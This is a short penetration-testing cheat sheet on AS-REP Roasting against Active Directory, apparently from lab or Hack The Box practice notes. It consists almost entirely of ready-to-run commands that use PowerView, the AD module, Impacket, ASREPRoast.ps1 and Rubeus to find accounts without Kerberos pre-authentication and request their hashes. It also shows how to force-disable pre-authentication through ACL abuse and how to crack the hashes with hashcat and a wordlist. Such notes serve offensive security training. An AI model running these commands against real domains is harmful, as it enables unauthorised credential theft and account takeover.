---
description: Kerberos Pre-Auth Disabled
---

# AS-REP Roasting

### Enumerating accounts with Kerberos Pre-auth disabled <a href="#enumerating-accounts-with-kerberos-pre-auth-disabled" id="enumerating-accounts-with-kerberos-pre-auth-disabled"></a>

#### Using PowerView (dev): <a href="#using-powerview-dev" id="using-powerview-dev"></a>

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

**Using Active Directory module:**

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

#### Using Impacket-Tools <a href="#using-impacket-tools" id="using-impacket-tools"></a>

```bash
impacket-GetNPUsers 'htb.local/' -dc-ip 10.10.10.161 
impacket-GetNPUsers evilcorp.local/ -dc-ip 192.168.23.157 -usersfile usernames.txt 
```

```bash
impacket-GetNPUsers 'htb.local/' -dc-ip 10.10.10.161 -request
```

#### ASREPRoast.ps1 <a href="#asreproast.ps1" id="asreproast.ps1"></a>

```powershell
 . .\ASREPRoast\ASREPRoast.ps1
 
 Get-ASREPHash -UserName VPN1user -Verbose
```

#### To enumerate all users with Kerberos preauth disabled and request a has <a href="#to-enumerate-all-users-with-kerberos-preauth-disabled-and-request-a-has" id="to-enumerate-all-users-with-kerberos-preauth-disabled-and-request-a-has"></a>

```powershell
Invoke-ASREPRoast -Verbose
```

### Rubeus <a href="#rubeus" id="rubeus"></a>

```batch
.\Rubeus.exe asreproast /nowrap
```

### Force disable Kerberos Preauth: <a href="#force-disable-kerberos-preauth" id="force-disable-kerberos-preauth"></a>

Let's enumerate the permissions for RDPUsers on ACLs using PowerView(dev):

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR@{useraccountcontrol=4194304} –Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```

#### Cracking AS-REP Hash <a href="#cracking-as-rep" id="cracking-as-rep"></a>

```batch
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
